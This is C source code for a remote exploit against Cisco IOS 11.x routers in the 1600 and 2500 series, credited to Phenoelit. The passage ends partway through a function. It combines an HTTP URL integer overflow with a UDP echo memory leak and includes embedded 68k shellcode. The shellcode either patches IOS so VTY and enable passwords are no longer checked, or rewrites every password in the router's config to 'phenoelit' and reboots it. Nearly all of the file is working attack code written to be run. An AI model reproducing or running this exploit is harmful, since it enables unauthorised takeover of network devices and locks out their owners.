/*
*               ..--==[[ Phenoelit ]]==--..
*              /                                     \
*             |       CISCO CASUM EST      |
*              \..                                 ../
*                 ~~---==(MMIII)==---~~
* 
*
* Cisco IOS 12.x/11.x remote exploit for HTTP integer overflow in URL using 
* IOS 11.x UDP Echo memory leak for shellcode placing and address calculation.
*
* This code does support exploitation of any 11.x Cisco 1600 and 2500 series 
* running "ip http server" and "service udp-small-servers". In other words, 
* port 80 TCP and port 7 UDP have to be open. The exploitation will take a 
* very long time since the overflow is triggered by sending 2 Gigabytes of 
* data to the device. Depending on your connection to the target, this may 
* take up to several DAYS.
*
* Shellcodes:
* o In case a 1600 running 11.3(11b) IP only is detected, a runtime IOS 
* patching shellcode is used. After that, the device will no longer 
* validate VTY and enable access passwords. Mission accomplished.
* o In case of any other 11.x IOS or in case it runs from flash where 
* code patching is more complicated, the shellcode will replace all 
* passwords in the config with "phenoelit" and reboot the box. Change
* the passwords in the shellcodes if you like.
*
* ---
* FX of Phenoelit <fx at phenoelit.de>
* 
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "protocols.h"
#include "packets.h"

char m68nop[] = "\x4E\x71";
char returncode[] = 
"\x24\x7c\x02\x0b\xfe\x30" //moveal #34340400,%a2 (0x00000000)
"\x34\xbc\x4e\x75" //movew #20085,%a2@ (0x00000006)
"\x24\x7c\x02\x04\xae\xfa" //moveal #33861370,%a2 (0x0000000A)
"\x24\xfc\x30\x3c\x00\x01" //movel #809238529,%a2@+ (0x00000010)
"\x24\xfc\x4c\xee\x04\x0c" //movel #1290667020,%a2@+ (0x00000016)
"\x24\xfc\xff\xf4\x4e\x5e" //movel #-766370,%a2@+ (0x0000001C)
"\x24\xfc\x4e\x75\x00\x00" //movel #1316290560,%a2@+ (0x00000022)
"\x24\x7c\x02\x07\x21\x6a" //moveal #34021738,%a2 (0x00000028)
"\x34\xbc\x4e\x71" //movew #20081,%a2@ (0x0000002E)
"\x24\x4f" //moveal %sp,%a2 (0x00000032)
"\x0c\x1f\x00\x02" //cmpib #2,%sp@+ (0x00000034)
"\x0c\x97\x02\x19\xfc\xc0" //cmpil #35257536,%sp@ (0x00000038)
"\x66\x00\xff\xf4" //bnew 34 <findret> (0x0000003E)
"\x24\x8f" //movel %sp,%a2@ (0x00000042)
"\x59\x92" //subql #4,%a2@ (0x00000044)
"\x2c\x52" //moveal %a2@,%fp (0x00000046)
"\x42\x80" //clrl %d0 (0x00000048)
"\x4c\xee\x04\x00\xff\xfc" //moveml %fp@(-4),%a2 (0x0000004A)
"\x4e\x5e" //unlk %fp (0x00000050)
"\x4e\x75" //rts (0x00000052)
;

char modcfg[] =
"\x20\x7c\x0f\xf0\x10\xc2" //moveal #267391170,%a0 (0x00000000)
"\xe2\xd0" //lsrw %a0@ (0x00000006)
"\x46\xfc\x27\x00" //movew #9984,%sr (0x00000008)
"\x20\x7c\x0f\xf0\x10\xc2" //moveal #267391170,%a0 (0x0000000C)
"\x30\xbc\x00\x01" //movew #1,%a0@ (0x00000012)
"\x20\x7c\x0e\x00\x00\x00" //moveal #234881024,%a0 (0x00000016)
"\x54\x88" //addql #2,%a0 (0x0000001C)
"\x0c\x50\xab\xcd" //cmpiw #-21555,%a0@ (0x0000001E)
"\x66\xf8" //bnes 1c <find_magic> (0x00000022)
"\x22\x48" //moveal %a0,%a1 (0x00000024)
"\x58\x89" //addql #4,%a1 (0x00000026)
"\x24\x49" //moveal %a1,%a2 (0x00000028)
"\x50\x8a" //addql #8,%a2 (0x0000002A)
"\x50\x8a" //addql #8,%a2 (0x0000002C)
"\x0c\x12\x00\x00" //cmpib #0,%a2@ (0x0000002E)
"\x67\x28" //beqs 5c <end_of_config> (0x00000032)
"\x4b\xfa\x00\xc6" //lea %pc@(fc <S_password>),%a5 (0x00000034)
"\x61\x5a" //bsrs 94 <strstr> (0x00000038)
"\x4a\x80" //tstl %d0 (0x0000003A)
"\x67\x08" //beqs 46 <next1> (0x0000003C)
"\x28\x40" //moveal %d0,%a4 (0x0000003E)
"\x4b\xfa\x00\xcf" //lea %pc@(111 <REPLACE_password>),%a5 (0x00000040)
"\x61\x62" //bsrs a8 <nvcopy> (0x00000044)
"\x4b\xfa\x00\xc0" //lea %pc@(108 <S_enable>),%a5 (0x00000046)
"\x61\x48" //bsrs 94 <strstr> (0x0000004A)
"\x4a\x80" //tstl %d0 (0x0000004C)
"\x67\x08" //beqs 58 <next2> (0x0000004E)
"\x28\x40" //moveal %d0,%a4 (0x00000050)
"\x4b\xfa\x00\xc8" //lea %pc@(11c <REPLACE_enable>),%a5 (0x00000052)
"\x61\x50" //bsrs a8 <nvcopy> (0x00000056)
"\x52\x8a" //addql #1,%a2 (0x00000058)
"\x60\xd2" //bras 2e <modmain> (0x0000005A)
"\x32\xbc\x00\x00" //movew #0,%a1@ (0x0000005C)
"\x7e\x01" //moveq #1,%d7 (0x00000060)
"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x00000062)
"\x9d\x47" //subxw %d7,%d6 (0x00000068)
"\x6b\xfc" //bmis 68 <chksm_delay> (0x0000006A)
"\x2a\x48" //moveal %a0,%a5 (0x0000006C)
"\x61\x50" //bsrs c0 <chksum> (0x0000006E)
"\x32\x86" //movew %d6,%a1@ (0x00000070)
"\x7e\x01" //moveq #1,%d7 (0x00000072)
"\x28\x3c\x00\x00\xff\xff" //movel #65535,%d4 (0x00000074)
"\x99\x47" //subxw %d7,%d4 (0x0000007A)
"\x6b\xfc" //bmis 7a <final_delay> (0x0000007C)
"\x46\xfc\x27\x00" //movew #9984,%sr (0x0000007E)
"\x20\x7c\x0f\xf0\x00\x00" //moveal #267386880,%a0 (0x00000082)
"\x2e\x50" //moveal %a0@,%sp (0x00000088)
"\x20\x7c\x0f\xf0\x00\x04" //moveal #267386884,%a0 (0x0000008A)
"\x20\x50" //moveal %a0@,%a0 (0x00000090)
"\x4e\xd0" //jmp %a0@ (0x00000092)
"\x28\x4a" //moveal %a2,%a4 (0x00000094)
"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x00000096)
"\x67\x08" //beqs a4 <strstr_endofstr> (0x0000009A)
"\xb9\x0d" //cmpmb %a5@+,%a4@+ (0x0000009C)
"\x67\xf6" //beqs 96 <strstr_2> (0x0000009E)
"\x42\x80" //clrl %d0 (0x000000A0)
"\x4e\x75" //rts (0x000000A2)
"\x20\x0c" //movel %a4,%d0 (0x000000A4)
"\x4e\x75" //rts (0x000000A6)
"\x7e\x01" //moveq #1,%d7 (0x000000A8)
"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x000000AA)
"\x67\x0e" //beqs be <nvcopy_end> (0x000000AE)
"\x18\xdd" //moveb %a5@+,%a4@+ (0x000000B0)
"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x000000B2)
"\x9d\x47" //subxw %d7,%d6 (0x000000B8)
"\x6b\xfc" //bmis b8 <nvcopy_delay> (0x000000BA)
"\x60\xec" //bras aa <nvcopyl1> (0x000000BC)
"\x4e\x75" //rts (0x000000BE)
"\x42\x87" //clrl %d7 (0x000000C0)
"\x42\x80" //clrl %d0 (0x000000C2)
"\x0c\x55\x00\x00" //cmpiw #0,%a5@ (0x000000C4)
"\x66\x0a" //bnes d4 <chk_hack> (0x000000C8)
"\x52\x80" //addql #1,%d0 (0x000000CA)
"\x0c\x80\x00\x00\x00\x0a" //cmpil #10,%d0 (0x000000CC)
"\x67\x08" //beqs dc <chk2> (0x000000D2)
"\x42\x86" //clrl %d6 (0x000000D4)
"\x3c\x1d" //movew %a5@+,%d6 (0x000000D6)
"\xde\x86" //addl %d6,%d7 (0x000000D8)
"\x60\xe8" //bras c4 <chk1> (0x000000DA)
"\x2c\x07" //movel %d7,%d6 (0x000000DC)
"\x2a\x07" //movel %d7,%d5 (0x000000DE)
"\x02\x86\x00\x00\xff\xff" //andil #65535,%d6 (0x000000E0)
"\xe0\x8d" //lsrl #8,%d5 (0x000000E6)
"\xe0\x8d" //lsrl #8,%d5 (0x000000E8)
"\xdc\x45" //addw %d5,%d6 (0x000000EA)
"\x28\x06" //movel %d6,%d4 (0x000000EC)
"\x02\x84\xff\xff\x00\x00" //andil #-65536,%d4 (0x000000EE)
"\x66\x00\xff\xea" //bnew e0 <chk3> (0x000000F4)
"\x46\x46" //notw %d6 (0x000000F8)
"\x4e\x75" //rts (0x000000FA)

"\x0a"" password ""\x00"
"\x0a""enable ""\x00"
"phenoelit\x0a""\x00"
"password phenoelit\x0a""\x00"
;


char modcfg2k5[] = 
"\x46\xfc\x27\x00" //movew #9984,%sr (0x00000000)
"\x20\x7c\x02\x00\x00\x00" //moveal #33554432,%a0 (0x00000004)
"\x54\x88" //addql #2,%a0 (0x0000000A)
"\x0c\x50\xab\xcd" //cmpiw #-21555,%a0@ (0x0000000C)
"\x66\xf8" //bnes a <find_magic> (0x00000010)
"\x22\x48" //moveal %a0,%a1 (0x00000012)
"\x58\x89" //addql #4,%a1 (0x00000014)
"\x24\x49" //moveal %a1,%a2 (0x00000016)
"\x50\x8a" //addql #8,%a2 (0x00000018)
"\x50\x8a" //addql #8,%a2 (0x0000001A)
"\x0c\x12\x00\x00" //cmpib #0,%a2@ (0x0000001C)
"\x67\x28" //beqs 4a <end_of_config> (0x00000020)
"\x4b\xfa\x00\xd6" //lea %pc@(fa <S_password>),%a5 (0x00000022)
"\x61\x6a" //bsrs 92 <strstr> (0x00000026)
"\x4a\x80" //tstl %d0 (0x00000028)
"\x67\x08" //beqs 34 <next1> (0x0000002A)
"\x28\x40" //moveal %d0,%a4 (0x0000002C)
"\x4b\xfa\x00\xdf" //lea %pc@(10f <REPLACE_password>),%a5 (0x0000002E)
"\x61\x72" //bsrs a6 <nvcopy> (0x00000032)
"\x4b\xfa\x00\xd0" //lea %pc@(106 <S_enable>),%a5 (0x00000034)
"\x61\x58" //bsrs 92 <strstr> (0x00000038)
"\x4a\x80" //tstl %d0 (0x0000003A)
"\x67\x08" //beqs 46 <next2> (0x0000003C)
"\x28\x40" //moveal %d0,%a4 (0x0000003E)
"\x4b\xfa\x00\xd8" //lea %pc@(11a <REPLACE_enable>),%a5 (0x00000040)
"\x61\x60" //bsrs a6 <nvcopy> (0x00000044)
"\x52\x8a" //addql #1,%a2 (0x00000046)
"\x60\xd2" //bras 1c <modmain> (0x00000048)
"\x42\x80" //clrl %d0 (0x0000004A)
"\x2a\x49" //moveal %a1,%a5 (0x0000004C)
"\x52\x00" //addqb #1,%d0 (0x0000004E)
"\x1a\xfc\x00\x00" //moveb #0,%a5@+ (0x00000050)
"\x7e\x01" //moveq #1,%d7 (0x00000054)
"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x00000056)
"\x9d\x47" //subxw %d7,%d6 (0x0000005C)
"\x6b\xfc" //bmis 5c <chksm_delay> (0x0000005E)
"\x0c\x00\x00\x02" //cmpib #2,%d0 (0x00000060)
"\x66\xe8" //bnes 4e <chksm_del> (0x00000064)
"\x2a\x48" //moveal %a0,%a5 (0x00000066)
"\x61\x54" //bsrs be <chksum> (0x00000068)
"\x2a\x49" //moveal %a1,%a5 (0x0000006A)
"\x52\x8d" //addql #1,%a5 (0x0000006C)
"\x42\x80" //clrl %d0 (0x0000006E)
"\x52\x00" //addqb #1,%d0 (0x00000070)
"\x1a\x86" //moveb %d6,%a5@ (0x00000072)
"\x7e\x01" //moveq #1,%d7 (0x00000074)
"\x28\x3c\x00\x00\xff\xff" //movel #65535,%d4 (0x00000076)
"\x99\x47" //subxw %d7,%d4 (0x0000007C)
"\x6b\xfc" //bmis 7c <final_delay> (0x0000007E)
"\xe0\x4e" //lsrw #8,%d6 (0x00000080)
"\x2a\x49" //moveal %a1,%a5 (0x00000082)
"\x0c\x00\x00\x02" //cmpib #2,%d0 (0x00000084)
"\x66\xe6" //bnes 70 <final_wr> (0x00000088)
"\x20\x7c\x03\x00\x00\x60" //moveal #50331744,%a0 (0x0000008A)
"\x4e\xd0" //jmp %a0@ (0x00000090)
"\x28\x4a" //moveal %a2,%a4 (0x00000092)
"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x00000094)
"\x67\x08" //beqs a2 <strstr_endofstr> (0x00000098)
"\xb9\x0d" //cmpmb %a5@+,%a4@+ (0x0000009A)
"\x67\xf6" //beqs 94 <strstr_2> (0x0000009C)
"\x42\x80" //clrl %d0 (0x0000009E)
"\x4e\x75" //rts (0x000000A0)
"\x20\x0c" //movel %a4,%d0 (0x000000A2)
"\x4e\x75" //rts (0x000000A4)
"\x7e\x01" //moveq #1,%d7 (0x000000A6)
"\x0c\x15\x00\x00" //cmpib #0,%a5@ (0x000000A8)
"\x67\x0e" //beqs bc <nvcopy_end> (0x000000AC)
"\x18\xdd" //moveb %a5@+,%a4@+ (0x000000AE)
"\x2c\x3c\x00\x00\xff\xff" //movel #65535,%d6 (0x000000B0)
"\x9d\x47" //subxw %d7,%d6 (0x000000B6)
"\x6b\xfc" //bmis b6 <nvcopy_delay> (0x000000B8)
"\x60\xec" //bras a8 <nvcopyl1> (0x000000BA)
"\x4e\x75" //rts (0x000000BC)
"\x42\x87" //clrl %d7 (0x000000BE)
"\x42\x80" //clrl %d0 (0x000000C0)
"\x0c\x55\x00\x00" //cmpiw #0,%a5@ (0x000000C2)
"\x66\x0a" //bnes d2 <chk_hack> (0x000000C6)
"\x52\x80" //addql #1,%d0 (0x000000C8)
"\x0c\x80\x00\x00\x00\x14" //cmpil #20,%d0 (0x000000CA)
"\x67\x08" //beqs da <chk2> (0x000000D0)
"\x42\x86" //clrl %d6 (0x000000D2)
"\x3c\x1d" //movew %a5@+,%d6 (0x000000D4)
"\xde\x86" //addl %d6,%d7 (0x000000D6)
"\x60\xe8" //bras c2 <chk1> (0x000000D8)
"\x2c\x07" //movel %d7,%d6 (0x000000DA)
"\x2a\x07" //movel %d7,%d5 (0x000000DC)
"\x02\x86\x00\x00\xff\xff" //andil #65535,%d6 (0x000000DE)
"\xe0\x8d" //lsrl #8,%d5 (0x000000E4)
"\xe0\x8d" //lsrl #8,%d5 (0x000000E6)
"\xdc\x45" //addw %d5,%d6 (0x000000E8)
"\x28\x06" //movel %d6,%d4 (0x000000EA)
"\x02\x84\xff\xff\x00\x00" //andil #-65536,%d4 (0x000000EC)
"\x66\x00\xff\xea" //bnew de <chk3> (0x000000F2)
"\x46\x46" //notw %d6 (0x000000F6)
"\x4e\x75" //rts (0x000000F8)

"\x0a"" password ""\x00"
"\x0a""enable ""\x00"
"phenoelit\x0a""\x00"
"password phenoelit\x0a""\x00"
;

//
// address selection strategies 
//
#define S_RANDOM 1
#define S_LAST 2
#define S_SMALLEST 3
#define S_HIGHEST 4
#define S_FREQUENT 5
typedef struct {
unsigned int a;
unsigned int count;
} addrs_t;
#define LOW_ADDR_THR 5
#define LOW_COUNT_THR 3


//
// IO memory block header based fingerprinting
//
static struct {
unsigned int PC_start;
unsigned int PC_end;
unsigned int IO_start;
unsigned int IO_end;
char *name;
unsigned char *code;
unsigned int codelen;
unsigned char *nop;
unsigned int noplen;
unsigned int fakefp;
} cisco_boxes[] = {
{0x08000000, 0x08ffffff, 0x02C00000, 0x02FFFFFF,
"Cisco 1600 series, run from Flash", 
modcfg, sizeof(modcfg)-1, 
m68nop, sizeof(m68nop)-1 ,
0x02f0f1f2
},

{0x0208F600, 0x0208F93C, 0x02C00000, 0x02FFFFFF,
"Cisco 1603, 11.3(11b) IP only, run from RAM", 
returncode, sizeof(returncode)-1,
m68nop, sizeof(m68nop)-1 ,
0x02f0f1f2
},

{0x03000000, 0x037FFFFF, 0x00E00000, 0x00FFFFFF,
"Cisco 2500 series, run from Flash",
modcfg2k5, sizeof(modcfg2k5)-1,
m68nop, sizeof(m68nop)-1,
0x00079000
},

{0,0,0,0,NULL,NULL,0,NULL,0,0}
};


// ***************** Status and other tracking *******************

//
// HTTP communication 
//
struct {
int sfd;
unsigned int done;
} http;

// 
// UDP leak 
//
#define MAXADDRS 100
#define DEFAULTRUNS 206
#define LOCALPORT 31336 // almost 31337 ;)
#define PACKETMAX 1400
struct {
int sfd;
int udpsfd;
int guess;
addrs_t addrs[MAXADDRS];
unsigned int addrc;
unsigned int lastaddr;
int nop_offset;
int nop_sled;
} leak;

//
// config
//
struct {
char *device;
char *target;
struct in_addr target_addr;
int verbose;
int testmode;
int strategy;
unsigned int leakme;
unsigned int timeout;
unsigned int leakruns;
} cfg;


//
// function prototypes
//
void usage(char *s);
void *smalloc(size_t s);
int HTTPpre(void);
void HTTPsend(char *what);
int IOSlack(unsigned int runs, int shellcode);
unsigned char *UDPecho( unsigned int *plen, 
unsigned char *payload, unsigned int payload_len);
void UDPanalyze(unsigned char *b, unsigned int len,
unsigned char *expected, unsigned int expected_length);
unsigned int SelectAddress(void);
int CheckForbidden(unsigned int address);


// *************************** main code *************************


int main(int argc, char **argv) {
// 
// HTTP elements
//
char token6[] ="/Cisco";
char token50[]="/AnotherLemmingAndAntoherLemmingAndAnotherLemmingX";
char token48[]="/HereComesTheFinalLemmingAndClosesTheGapForever/";
char httpend[]=" HTTP/1.0\r\n\r\n";
char overflow[30];
// 
// stuff we need
//
unsigned int i;
int saved_guess;
unsigned int retaddr;
// 
// command line
//
char option;
extern char *optarg;
//
// output stuff
//
double percent;
double lpercent=(double)0;


memset(&cfg,0,sizeof(cfg));
memset(&leak,0,sizeof(leak));
memset(&http,0,sizeof(http));
// 
// set defaults
//
cfg.leakme=0x4C00;
cfg.timeout=3;
cfg.leakruns=DEFAULTRUNS;
cfg.strategy=S_SMALLEST;

while ((option=getopt(argc,argv,"vTA:t:L:R:d:i:"))!=EOF) {
switch(option) {
case 'v': cfg.verbose++;
break;
case 'T': cfg.testmode++;
break;
case 'A': cfg.strategy=(int)strtoul(optarg,(char **)NULL,10);
break;
case 't': cfg.timeout=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'L': cfg.leakme=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'R': cfg.leakruns=(int)strtoul(optarg,(char **)NULL,10);
break;
case 'd': {
struct hostent *he;
if ((he=gethostbyname(optarg))==NULL) { 
fprintf(stderr,"Could not resolve %s\n",cfg.target);
return (-1);
}
bcopy(he->h_addr,
(char *)&(cfg.target_addr.s_addr),
he->h_length);
cfg.target=smalloc(strlen(optarg)+1);
strcpy(cfg.target,optarg);
}
break;
case 'i': cfg.device=smalloc(strlen(optarg)+1);
strcpy(cfg.device,optarg);
break;
default: usage(argv[0]);
// does not return
}
}

// 
// idiot check
//
if ( !(cfg.device && *((u_int32_t *)&(cfg.target_addr)) )) 
usage(argv[0]);

//
// verify the UDP leak and make sure it's a known box
//
if (IOSlack(1,-1)!=0) {
fprintf(stderr,"You need an IOS 11.x target with UDP echo service enabled\n"
"for this thing to work. Obviously, you don't have that.\n");
return (1);
}
if (leak.guess==(-1)) {
fprintf(stderr,"Apparently, you got a good target, but it's not one of the\n"
"platforms we got code for. Life sucks.\n");
return (1);
} else {
printf("Target identified as '%s'.\n",cisco_boxes[leak.guess].name);
if (cfg.verbose) {
printf("Using the following code:\n");
hexdump(cisco_boxes[leak.guess].code,
cisco_boxes[leak.guess].codelen);
}
saved_guess=leak.guess;
}
if (leak.lastaddr == 0) {
printf("The memory leak data did not contain enough information to\n"
"calculate the addresses correctly. The router may be busy,\n"
"in which case this method is likely to fail!\n");
return (2);
} else {
printf("Calculated address in test: 0x%08X\n",leak.lastaddr);
}

//
// Connect to HTTP server and send the first "GET "
//
if (HTTPpre()!=0) return 1;

//
// fill normal buffer
//
printf("Sending token50 x 0x5 + token6 ...\n");
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token50);
HTTPsend(token6);

//
// send enough data to overflow the counter
//
i=1;
printf("Sending token50 x 0x28F5C28 (2 Gigabytes of data)...\n");
while (i<=0x28F5C28) {

if (!cfg.testmode) HTTPsend(token50);
http.done+=50;
i++;

//
// output
//
percent = (double)http.done / (double)0x80000000;
if ( percent > lpercent+0.0001 ) {
printf("%5.2f%% done\n",percent * 100);
lpercent=percent;
}
}
printf("Sending final token48 ...\n");
HTTPsend(token48);

//
// Use infoleak to transfer code and calculate address
//
memset(&leak,0,sizeof(leak));
if (IOSlack(cfg.leakruns,saved_guess)!=0) {
fprintf(stderr,"Your target does no longer leak memory. This could have\n"
"several reasons, but it sure prevents you from exploiting it.\n");
return (-1);
} else {
printf("Aquired %u addresses with our code\n",leak.addrc);
if (leak.addrc<LOW_ADDR_THR) {
printf( "WARNING: This is a low number of addresses.\n"
" The target is probably busy!!\n");
}
}
if (saved_guess!=leak.guess) 
printf("Errrmmm... your target type changed. Just so you know, \n"
"it's not supposed to do that\n");

// 
// prepare the overflow buffer
//
printf("Selecting address, using nop sled of %u and offset in the sled of %u\n",
leak.nop_sled, leak.nop_offset);
if ( (retaddr=SelectAddress()) == 0) return (-1);

memset(&overflow,0,sizeof(overflow));
sprintf(overflow,
"BB%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X%%%02X"
,
(unsigned char)( (cisco_boxes[saved_guess].fakefp>>24)&0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp>>16)&0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp>> 8)&0xFF),
(unsigned char)( (cisco_boxes[saved_guess].fakefp )&0xFF),
(unsigned char)( (retaddr>>24)&0xFF),
(unsigned char)( (retaddr>>16)&0xFF),
(unsigned char)( (retaddr>> 8)&0xFF),
(unsigned char)( (retaddr )&0xFF));

if (cfg.verbose) hexdump(overflow,sizeof(overflow)-1);

// 
// perform overflow and overwrite return address
//
printf("Sending overflow of %u bytes\n",strlen(overflow));
HTTPsend(overflow);
printf("Sending final HTTP/1.0\n");
HTTPsend(httpend);
close(http.sfd);

// 
// all done
//
return 0;
}


void usage(char *s) {
fprintf(stderr,"Usage: %s -i <interface> -d <target> [-options]\n",s);
fprintf(stderr,"Options are:\n"
"-v Verbose mode.\n"
"-T Test mode, don't really exploit\n"
"-An Address selection strategy. Values are:\n"
" 1 (random), 2 (last), 3 (smallest), 4 (highest), 5 (most frequent)\n"
"-tn Set timeout for info leak to n seconds\n"
"-Ln Set requested memory leak to n bytes\n"
"-Rn Set number of final leak runs to n\n"
);
exit (1);
}


// 
// *********************** HTTP related **************************
//


int HTTPpre(void) {
char get[] = "GET ";
struct sockaddr_in sin;
struct hostent *he;

memset(&sin,0,sizeof(struct sockaddr_in));
if ((he=gethostbyname(cfg.target))==NULL) { 
fprintf(stderr,"Could not resolve %s\n",cfg.target);
return (-1);
}

sin.sin_family=AF_INET;
sin.sin_port=htons(80);
bcopy(he->h_addr,(char *)&sin.sin_addr,he->h_length);
bzero(&(sin.sin_zero),8);

if ((http.sfd=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
fprintf(stderr,"socket(TCP) error\n");
return(-1);
}

printf("Connecting to HTTP server on %s ...\n",cfg.target);

if (connect(http.sfd,(struct sockaddr *)&sin,sizeof(sin))<0) {
fprintf(stderr,"Failed to connect to HTTP\n");
return (-1);
}

printf("Connected!\n");

//
// send "GET "
//
HTTPsend(get);
return 0;
}


void HTTPsend(char *what) {
if (send(http.sfd,what,strlen(what),0)<0) {
fprintf(stderr,"send() failed!\n");
exit(-1);
}
}


// 
// *********************** UDP related **************************
//

int IOSlack(unsigned int runs, int shellcode) {
// 
// the leak packet
//
#define DUMMY_SIZE 512
unsigned char *packet;
unsigned int length;
char dummy[DUMMY_SIZE];
unsigned char *sc,*st;
unsigned int sclen;
// 
// recv stuff
//
char *rbuf;
unsigned int rx;
// 
// doing the stuff
//
unsigned int r;
struct sockaddr_in frm;
int frmlen=sizeof(struct sockaddr_in);
fd_set rfds;
struct timeval tv;
int select_ret;
int recvflag;
struct sockaddr_in myself;


//
// init
//
leak.guess=(-1);
r=runs;
recvflag=0;
st=NULL;

// 
// get the sockets
//
if ( (leak.sfd=init_socket_IP4(cfg.device,1)) == (-1) ) {
fprintf(stderr,"Couldn't grab a raw socket\n");
return (-1);
}

myself.sin_family=AF_INET;
myself.sin_port=htons(LOCALPORT);
myself.sin_addr.s_addr=INADDR_ANY;
if ( (leak.udpsfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP)) <0) {
fprintf(stderr,"Couldn't grab a UDP socket\n");
return (-1);
}
if ( bind(leak.udpsfd,(struct sockaddr *)&myself,sizeof(struct sockaddr)) != 0) {
fprintf(stderr,"bind() failed\n");
return (-1);
}

// 
// determine packet contents and make a packet
//
if (shellcode==(-1)) {
memset(&dummy,0x50,DUMMY_SIZE-1);
dummy[DUMMY_SIZE-1]=0x00;
sc=dummy;
sclen=DUMMY_SIZE-1;
} else {
unsigned char *t;
unsigned int i;

t=sc=st=smalloc(PACKETMAX);
//
// calculate the remaining space for nops
//
leak.nop_sled=PACKETMAX-cisco_boxes[shellcode].codelen;
// 
// align
//
while ( (leak.nop_sled % cisco_boxes[shellcode].noplen) != 0) 
leak.nop_sled--;
for (i=0;i< (leak.nop_sled/cisco_boxes[shellcode].noplen) ;i++) {
memcpy(t,cisco_boxes[shellcode].nop,cisco_boxes[shellcode].noplen);
t+=cisco_boxes[shellcode].noplen;
}
// 
// add the real code
//
memcpy(t,cisco_boxes[shellcode].code,cisco_boxes[shellcode].codelen);
t+=cisco_boxes[shellcode].codelen;
sclen=leak.nop_sled + cisco_boxes[shellcode].codelen;
//
// calculate a nop_offset and align
//
leak.nop_offset=leak.nop_sled * 0.8;
while ( (leak.nop_offset % cisco_boxes[shellcode].noplen) != 0) 
leak.nop_offset--;

if (cfg.verbose) hexdump(st,sclen);

}
packet=UDPecho(&length,sc,sclen);

//
// allocate receive buffer
//
rbuf=smalloc(cfg.leakme+0x200);

// 
// do it
//
printf("Getting IO memory leak data (%u times) ...\n",r);
while (r--) {
sendpack_IP4(leak.sfd,packet,length);

tv.tv_sec=cfg.timeout;
tv.tv_usec=0;
FD_ZERO(&rfds);
FD_SET(leak.udpsfd,&rfds);
select_ret=select(leak.udpsfd+1,&rfds,NULL,NULL,&tv);

if (select_ret>0) {
rx=recvfrom(leak.udpsfd,rbuf,cfg.leakme,0,(struct sockaddr *)&frm,&frmlen);
if (rx<0) {
fprintf(stderr,"UDP recvfrom() failed\n");
return (-1);
}
if (cfg.verbose) printf("Received %u bytes data\n",rx);
if (cfg.verbose>1) hexdump(rbuf,rx);
recvflag=1;
// 
// analyze what we got
//
UDPanalyze(rbuf,rx,sc,sclen);
} else {
printf("Timeout at %u - may be lost packet?\n",r);
}
}

//
// clean up
//
free(packet);
free(rbuf);
if (st!=NULL) free(st);
close(leak.sfd);
close(leak.udpsfd);
if (cfg.verbose==0) printf("\n"); // be nice

if (recvflag) { return 0; } else { return 1; }
}


unsigned char *UDPecho(
unsigned int *plen, // returned length of packet
unsigned char *payload, // pointer to payload
unsigned int payload_len // length of payload
) {
unsigned char *pack;
iphdr_t *ip;
udphdr_t *udp;
u_char *pay;
u_char *t;
u_int16_t cs;

*plen=sizeof(iphdr_t)+sizeof(udphdr_t)+payload_len;
pack=smalloc(*plen+10);

ip=(iphdr_t *)pack;
ip->version=4;
ip->ihl=sizeof(iphdr_t)/4;
ip->ttl=0x80;
ip->protocol=IPPROTO_UDP;
memcpy(&(ip->saddr.s_addr),&(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);
memcpy(&(ip->daddr.s_addr),&(cfg.target_addr),IP_ADDR_LEN);

udp=(udphdr_t *)((void *)ip+sizeof(iphdr_t));
udp->sport=htons(LOCALPORT);
udp->dport=htons(7);
udp->length=htons(cfg.leakme);

pay=(u_char *)((void *)udp+sizeof(udphdr_t));
t=pay;
memcpy(pay,payload,payload_len);
t+=payload_len;

ip->tot_len=htons(*plen);
cs=chksum((u_char *)ip,sizeof(iphdr_t));
ip->check=cs;

if (cfg.verbose>1) hexdump(pack,*plen);
return pack;
}


void UDPanalyze(unsigned char *b, unsigned int len,
unsigned char *expected, unsigned int expected_length) {
#define ST_MAGIC 1
#define ST_PID 2
#define ST_CHECK 3
#define ST_NAME 4
#define ST_PC 5
#define ST_NEXT 6
#define ST_PREV 7
#define ST_SIZE 8
#define ST_REF 9
#define ST_LASTDE 10
#define ST_ID_ME_NOW 100
unsigned char *p;
int state=0;
int i=0;

unsigned char *opcode_begin;
unsigned char *block2_next_field;
unsigned int block3_next_val;

unsigned int p_name;
unsigned int p_pc;
unsigned int p_next;
unsigned int p_prev;


opcode_begin=NULL;
block2_next_field=NULL;
block3_next_val=0;

if ((!memcmp(b,expected,expected_length))) {
if (cfg.verbose>1) printf("Payload found!\n");
opcode_begin=b;
}

p=b;
while ((b+len-4)>p) {

if ( (p[0]==0xfd) && (p[1]==0x01) && (p[2]==0x10) && (p[3]==0xDF) ) {
if (cfg.verbose>1) printf("REDZONE MATCH!\n");
else { printf("!"); fflush(stdout); }
state=ST_MAGIC;
p+=4;
}

switch (state) {
case ST_MAGIC:
if (cfg.verbose)
printf("MEMORY BLOCK\n");
state++;
p+=4;
break;

case ST_PID:
if (cfg.verbose)
printf("\tPID : %08X\n",ntohl(*(unsigned int *)p));
state++;
p+=4;
break;

case ST_CHECK:
if (cfg.verbose)
printf("\tAlloc Check: %08X\n",ntohl(*(unsigned int *)p));
state++; 
p+=4;
break;

case ST_NAME:
p_name=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf("\tAlloc Name : %08X\n",p_name);
state++;
p+=4;
break;

case ST_PC:
p_pc=ntohl(*(unsigned int *)p);
if (cfg.verbose)
printf("\tAlloc PC : %08X\n",p_pc);
state++;
p+=4;
break;

case ST_NEXT:
p_next=ntohl(*(unsigned int *)p);
if (cfg.verbose) 
